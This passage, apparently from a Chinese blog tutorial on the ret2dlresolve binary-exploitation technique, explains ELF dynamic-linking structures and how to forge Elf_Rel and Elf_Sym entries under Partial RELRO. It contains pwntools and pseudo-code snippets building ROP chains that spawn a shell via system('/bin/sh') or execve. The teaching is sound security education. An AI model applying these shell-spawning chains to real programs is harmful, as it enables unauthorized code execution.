+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>      Elf32_Word d_val<span class="op">;</span>                 <span class="co">/* Integer value */</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>      Elf32_Addr d_ptr<span class="op">;</span>                 <span class="co">/* Entry Address */</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> d_un<span class="op">;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> Elf32_Dyn<span class="op">;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>  Elf64_Sxword        d_tag<span class="op">;</span>           <span class="co">/* Dynamic entry type */</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>  <span class="kw">union</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>      Elf64_Xword d_val<span class="op">;</span>               <span class="co">/* Integer value */</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>      Elf64_Addr d_ptr<span class="op">;</span>                <span class="co">/* Address value */</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> d_un<span class="op">;</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> Elf64_Dyn<span class="op">;</span></span></code></pre></div>
+<p><code>d_tag</code>为<code>DT_STRTAB</code>时，第二项<code>d_ptr</code>即为<code>.dynstr</code>的基址。</p>
+<p>IDA中该条目如图所示：</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/image-20220515221854382.png" alt="image-20220515221854382">
+<figcaption aria-hidden="true">image-20220515221854382</figcaption>
+</figure>
+<p>利用的python伪代码如下，感受一下思路即可：</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">&quot;&quot;&quot;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co">controlable_addr    = 可控区域地址</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="co">Elf_Dyn_strtab_addr = .dynamic段中关键字为DT_STRTAB的Elf64_Dyn结构体的基址</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="co">st_name  = 要借用的正常函数的Elf64_Sym中函数字符串相对于strtab表的偏移</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="co">plt_addr = 借用函数的plt地址</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="co">offset   = 借用函数的Elf64_Rela结构体的索引</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="co">         （32位则为相对于表头的偏移）</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="co">&quot;&quot;&quot;</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>your_write(Elf_Dyn_strtab_addr<span class="op">+</span> <span class="bn">0x8</span>, controlable_addr<span class="op">-</span>st_name)</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>your_write(controlable_addr,<span class="st">&quot;system</span><span class="ch">\x00</span><span class="st">&quot;</span>)</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 控制寄存器，往system函数传参数</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>pass_args(rdi)</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="co"># 调用 _dl_runtime_resolve</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>_dl_runtime_resolve(<span class="op">&amp;</span>link_map, offset)</span></code></pre></div>
+<h4 id="小结-1">1.2 小结</h4>
+<p>可以看出<code>No RELRO</code>情况下的<code>ret2dlresolve</code>攻击还是比较方便的，一般情况下我们需要以下条件才能利用：</p>
+<ol type="1">
+<li>能够任意写；</li>
+<li>能够控制参数。如64位下控制寄存器，32位下控制栈，或者其他方式的参数控制；</li>
+<li>最后一步调用<code>_dl_runtime_resolve(link_map, offset)</code>一般情况下需要劫持控制流和参数，不过也可以借用未解析过的函数进行<code>ret2dlresolve</code>攻击，此时则不需要劫持控制流。</li>
+</ol>
+<h3 id="partial-relro">2. Partial RELRO</h3>
+<p>在<code>Partial RELRO</code>的情况下，<code>.dynamic</code>段标记被<code>read-only</code>，上述方法失效。</p>
+<p>我们知道，<code>.dynamic</code>段里面的值无非是一些动态段的基址，那么既然我们没法修改基址，那么我们可以改变结构体中的偏移即可，即<code>offset</code>够大，然后使得<code>基址+offset</code>落入到我们可控的内存，然后伪造对应的<code>dl_runtime_resolve</code>所涉及所有的条目，包括<code>Elf_Rel</code>、<code>Elf_Sym</code>以及函数字符串，这样就要求我们理解各个结构体之间的关系以及结构体各成员的含义了。</p>
+<h4 id="伪造各类dynmic条目">2.1 伪造各类Dynmic条目</h4>
+<h5 id="计算偏移">2.1.1 计算偏移</h5>
+<p>具体的，我们需要计算的偏移有：</p>
+<ol type="1">
+<li>传递给<code>_dl_runtime_resolve</code>函数的<code>offset</code>参数：32位下为<code>Elf32_Rel</code>条目到<code>.ret.plt</code>节的偏移，64位下为<code>Elf64_Rela</code>条目的索引值；</li>
+<li><code>Elf_Rel</code>结构体中的<code>r_info</code>：<code>r_info</code>是一个复合数值，其低8位为重定位类型（Relocation
+Types），一般在利用上选取<code>R_386_JMP_SLOT=R_X86_64_JUMP_SLOT=7</code>即函数类型进行填充。其具体定义参考<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/um/asm/elf.h#L109" target="_blank" rel="noopener">这里</a>。而剩下高位部分则为对应<code>Elf_Sym</code>条目在<code>.dynsym</code>中的下标，即<code>index  = (r_info &gt;&gt; 8)</code></li>
+<li><code>Elf_Sym</code>结构体中的<code>st_name</code>：该值为函数字符串相对于<code>.dynstr</code>表基址的偏移。</li>
+</ol>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--2.related-sections.png" alt="ret2dlresolve--2.related-sections">
+<figcaption aria-hidden="true">ret2dlresolve--2.related-sections</figcaption>
+</figure>
+<p>如上述分析，我们需要计算三个偏移（<code>offset</code>、<code>r_info</code>、<code>st_name</code>）以及三个结构体(<code>Elf_Rel</code>、<code>Elf_Sym</code>以及函数字符串)，其中字符串就不用分析了，那么现在我们需要了解<code>Elf_Rel</code>、<code>Elf_Sym</code>的含义。</p>
+<h5 id="elf_rel-相关">2.1.2 Elf_Rel 相关</h5>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* Elf_Rel size: 32 bit = 8B  </span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co">                 64 bit = 24B</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="co">*/</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span> <span class="op">{</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>     Elf32_Addr r_offset<span class="op">;</span> <span class="co">// 对应.got.plt表项的地址，解析后要回写的</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>     Elf32_Word r_info<span class="op">;</span>  <span class="co">// .dynsym表的下标(r_info &gt;&gt; 8)</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a> <span class="op">}</span> Elf32_Rel<span class="op">;</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span> <span class="op">{</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>    Elf64_Addr r_offset<span class="op">;</span> <span class="co">// 对应.got.plt表项的地址，解析后要回写的</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    Elf64_Xword r_info<span class="op">;</span> <span class="co">// .dynsym表的下标(r_info &gt;&gt; 8)</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>    Elf64_Sxword r_addend<span class="op">;</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a> <span class="op">}</span> Elf64_Rel<span class="op">;</span></span></code></pre></div>
+<p>注意到，在未开启<code>PIE</code>时<code>r_offset</code>是对应<code>.got.plt</code>表项的虚拟地址，而在开启<code>PIE</code>时，<code>r_offset</code>是对应<code>.got.plt</code>表项相对于ELF加载基址的偏移地址。</p>
+<p><code>r_info</code>在上文已介绍，不再赘述。</p>
+<h5 id="elf_sym-相关">2.1.3 Elf_Sym 相关</h5>
+<p>接下来是<code>Elf_Sym</code>结构体：</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span><span class="op">{</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>      Elf32_Word    st_name<span class="op">;</span>         <span class="co">/* 4B .dynstr中的字符串偏移 */</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>      Elf32_Addr    st_value<span class="op">;</span>        <span class="co">/* 4B （无需关心，置0）符号的值，一般为虚拟地址*/</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>      Elf32_Word    st_size<span class="op">;</span>         <span class="co">/* 4B （无需关心，置0）符号的大小，如果为0则表示该符号无需大小或大小未知 */</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>      <span class="dt">unsigned</span> <span class="dt">char</span>    st_info<span class="op">;</span>      <span class="co">/* 1B  符号的类型和绑定特征。高4位为符号的绑定特征，低4位为符号类型 */</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">unsigned</span> <span class="dt">char</span>    st_other<span class="op">;</span>     <span class="co">/* 1B （无需关心，置0）符号的可见性，0为默认符号可见性规则 */</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>      Elf32_Section    st_shndx<span class="op">;</span>     <span class="co">/* 2B （无需关心，置0）符号所在的section对应的section header的索引号，0为未定义节 */</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> Elf32_Sym<span class="op">;</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="co">//含义同上</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span> <span class="op">{</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>    Elf64_Word st_name<span class="op">;</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">char</span> st_info<span class="op">;</span></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">char</span> st_other<span class="op">;</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>    Elf64_Section st_shndx<span class="op">;</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>    Elf64_Addr st_value<span class="op">;</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>    Elf64_Xword st_size<span class="op">;</span></span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span>Elf64_Sym<span class="op">;</span></span></code></pre></div>
+<p>伪造条目时需要关心的只有两项：<code>st_name</code>，<code>st_info</code></p>
+<ol type="1">
+<li><code>st_name = String Addr - ELF String Table Start Addr</code>即相对于.dynstr的偏移</li>
+<li><code>st_info</code>大小为 1
+Btyes，高4位表示符号的绑定特征，低4位表示符号类型。</li>
+</ol>
+<p><strong>绑定特征（高四位）</strong>，</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_LOCAL   0       </span><span class="co">/* Local symbol  局部符号（本文件可见） */</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_GLOBAL  1       </span><span class="co">/* Global symbol 全局符号（多文件可见） */</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_WEAK    2       </span><span class="co">/* Weak symbol 弱符号，即遇到同名的符号优先弃用该符号的声明*/</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_NUM     3       </span><span class="co">/* Number of defined types.  */</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_LOOS    10      </span><span class="co">/* Start of OS-specific */</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_GNU_UNIQUE  10      </span><span class="co">/* Unique symbol.  */</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_HIOS    12      </span><span class="co">/* End of OS-specific */</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_LOPROC  13      </span><span class="co">/* Start of processor-specific */</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STB_HIPROC  15      </span><span class="co">/* End of processor-specific */</span></span></code></pre></div>
+<p>绑定特征<code>0,1,2</code>均可取</p>
+<p><strong>符号类型（低四位）</strong></p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_NOTYPE  0       </span><span class="co">/* Symbol type is unspecified */</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_OBJECT  1       </span><span class="co">/* Symbol is a data object */</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_FUNC    2       </span><span class="co">/* Symbol is a code object */</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_SECTION 3       </span><span class="co">/* Symbol associated with a section */</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_FILE    4       </span><span class="co">/* Symbol&#39;s name is file name */</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_COMMON  5       </span><span class="co">/* Symbol is a common data object */</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_TLS     6       </span><span class="co">/* Symbol is thread-local data object*/</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_NUM     7       </span><span class="co">/* Number of defined types.  */</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_LOOS    10      </span><span class="co">/* Start of OS-specific */</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_GNU_IFUNC   10  </span><span class="co">/* Symbol is indirect code object */</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_HIOS    12      </span><span class="co">/* End of OS-specific */</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_LOPROC  13      </span><span class="co">/* Start of processor-specific */</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#define STT_HIPROC  15      </span><span class="co">/* End of processor-specific */</span></span></code></pre></div>
+<p>函数和变量分别取<code>1, 2</code> 即可</p>
+<p>那么稍微总结一下得到<code>st_info</code>取值的一般规律如下：</p>
+<pre><code>绑定函数:        st_info = 0x12 例如: read,printf,__libc_start_main
+绑定全局变量:    st_info = 0x11 例如: stdin，stdout,_IO_stdin_used
+绑定弱变量:      st_info = 0x20 例如: __gmon_start__</code></pre>
+<h5 id="利用">2.1.4 利用</h5>
+<p>我们需要计算三个偏移（<code>offset</code>、<code>r_info</code>、<code>st_name</code>）以及三个结构体(<code>Elf_Rel</code>、<code>Elf_Sym</code>以及函数字符串)。考虑到一般情况下能够控制的内存空间长度是有限的，所以我们伪造的这些结构越紧凑越好，那么可以参考以下的构造方式：</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--4.Partial-RELRO.png" alt="ret2dlresolve--4.Partial-RELRO">
+<figcaption aria-hidden="true">ret2dlresolve--4.Partial-RELRO</figcaption>
+</figure>
+<p><code>pwntools</code>在这方面已经集成了自动化生成上述伪造条目的功能，并且能够通过搜寻<code>ROP gadget</code>来自动化帮助你构建所需ROP链，然后在ROP链中加入即可，如下代码所示：</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>writable_addr <span class="op">=</span> elf.bss(<span class="bn">0x100</span>)</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>dlresolve <span class="op">=</span> Ret2dlresolvePayload(elf,symbol<span class="op">=</span><span class="st">&quot;system&quot;</span>,args<span class="op">=</span>[<span class="st">&#39;/bin/sh&#39;</span>],data_addr<span class="op">=</span>writable_addr)</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>fake_entries <span class="op">=</span> dlresolve.payload</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>rop <span class="op">=</span> ROP(elf)</span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>rop.read(<span class="dv">0</span>,writable_addr, <span class="bu">len</span>(fake_entries)) <span class="co"># 将fake_entries写入可控内存</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>rop.ret2dlresolve(dlresolve)    <span class="co"># 将Ret2dlresolvePayload生成的ROP链加入，实际效果就是调用system(&quot;/bin/sh&quot;)</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="co"># print(rop.dump()) # 检查一下ROP链是否正确</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="co"># 加入ROP链中</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>payload  <span class="op">=</span> padding</span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> rop.chain()</span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>p.send(payload)</span></code></pre></div>
+<p>上述方法方便归方便，但只适用于能够自动化搜寻到<code>gadget</code>的情况，否则在调用<code>Ret2dlresolvePayload()</code>时将直接报错，无法进行。</p>
+<p>经过实践，<code>gadget</code>自动化搜寻是找不到通用<code>gadget csu</code>的，也就是你能手动<code>ret2csu</code>控制参数但是<code>Ret2dlresolvePayload(elf,symbol="system",args=['/bin/sh'],data_addr=writable_addr)</code>会报错。</p>
+<p>那么此时我们应该放弃好用的自动搜寻功能而手动构造<code>ROP</code>链，此时伪造<code>fake_entries</code>和计算传递给<code>_dl_runtime_resolve</code>函数的<code>offset</code>参数功能还是可用的。</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>writable_addr <span class="op">=</span> elf.bss(<span class="bn">0x100</span>)</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>dlresolve <span class="op">=</span> Ret2dlresolvePayload(elf,symbol<span class="op">=</span><span class="st">&quot;execve&quot;</span>,args<span class="op">=</span>[],data_addr<span class="op">=</span>writable_addr) <span class="co"># 传入空参数args，避免自动搜寻gadget</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>fake_entries <span class="op">=</span> dlresolve.payload <span class="co"># 但是利用该函数来构造fake_entries</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 手动构造ROP链（伪代码）</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>your_write(writable_addr, fake_entries) <span class="co"># 将fake_entries写入可控内存</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 如果是x64位，则需要额外控制一处内存</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>your_write(<span class="op">&amp;</span>link_map<span class="op">+</span><span class="bn">0x1c8</span>, <span class="st">b&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span><span class="op">*</span><span class="dv">8</span>) <span class="co"># 具体偏移是0x1c8还是0x1d0请看2.1.4小节</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>pass_args(<span class="st">b&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>,<span class="dv">0</span>,<span class="dv">0</span>)   <span class="co">#手动传递execve的参数</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="co"># 调用 _dl_runtime_resolve</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>_dl_runtime_resolve(<span class="op">&amp;</span>link_map, dlresolve.reloc_index) <span class="co"># 注意offset参数发生了变化，由Ret2dlresolvePayload计算得出</span></span></code></pre></div>
+<h5 id="坑点x64位下不同之处">2.1.5 坑点——x64位下不同之处</h5>
+<ol type="1">
+<li><code>_dl_runtime_resolve(link_map, offset)</code>的<code>offset</code>不再是<code>.dynsym</code>的入口偏移，而是变成了<code>dynsym</code>入口项的索引值<code>index</code>。即实际上调用的是<code>_dl_runtime_resolve(link_map, index)</code>
+，其中<code>index</code>的计算需要考虑<code>Elf64_Sym</code>结构体的大小（24B）；</li>
+<li><code>ELF_Rela</code>，<code>ELF64_Sym</code>等结构都增加了一些新结构（不需要特意记住，了解后工具构造即可）;</li>
+<li>ROP链过长可能会覆盖掉栈上的环境变量，此时调用<code>system("/bin/sh")</code>很可能会失败，可以转而调用<code>execve("/bin/sh",0,0)</code>，需要重新控制寄存器写入<code>rsi=rdx=0</code>。</li>
+<li><code>_dl_fixup</code>会从符号版本信息列表<code>l_versions[]</code>中根据偏移获取符号的版本信息，而该偏移则是我们伪造的<code>r_info</code>的<code>index</code>，代码中为<code>ndx</code>。
+在x32下，<code>l_versions[ndx]</code>一般都能在可映射区域，则可以取到值，不至于在<code>version = &amp;l-&gt;l_versions[ndx];</code>处引发内存不可达而程序终止；
+而在x64下，由于虚拟空间增大，<code>l_versions[ndx]</code>一般都不能在可映射区域，因为<code>Elf_sym</code>结构大小为16B，而<code>vernum</code>大小却只有2B，则在相同的<code>index</code>且起始点差不多的情况下，会导致一个落入我们的<code>bss</code>可控区域，一个落入内存不可达区域。则此时需要将<code>l_info[VERSYMIDX(DT_VERSYM)]</code>置为NULL，绕过<code>version = &amp;l-&gt;l_versions[ndx];</code>语句分支。
+根据源码中宏定义<code>VERSYMIDX(DT_VERSYM)=50</code>，<code>l_info</code>在<code>link_map</code>的偏移为64，则最终我们要使得<code>*(&amp;link_map+50*8+64)=*(&amp;link_map+0x1d0)=NULL</code>即可（该偏移适用于2.31），而在比较低版本的<code>Libc</code>中（如2.23），某些值会有些许变化，此时偏移为<code>0x1c8</code>（确定位移的最好方法就是调试然后确定偏移值）</li>
+</ol>
+<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_THISPROCNUM        0</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_NUM                35                            </span><span class="co">/* Number used */</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_VERNEEDNUM         0x6fffffff                   </span><span class="co">/* Number of needed versions */</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_VERSYM             0x6ffffff0</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_VERSIONTAGIDX(tag) (DT_VERNEEDNUM - (tag))       </span><span class="co">/* Reverse order! */</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define VERSYMIDX(sym)        (DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX (sym))</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="co">/* All references to the value of l_info[DT_PLTGOT],</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="co">  l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="co">  l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]</span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="co">  have to be accessed via the D_PTR macro.  The macro is needed since for</span></span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="co">  most architectures the entry is already relocated - but for some not</span></span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="co">  and we need to relocate at access time.  */</span></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef DL_RO_DYN_SECTION</span></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="pp"># define D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a><span class="pp">#else</span></span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a><span class="pp"># define D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif</span></span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a><span class="co">// in _dl_fixup()</span></span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>_dl_fixup <span class="op">(){</span></span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>    <span class="co">//......</span></span>
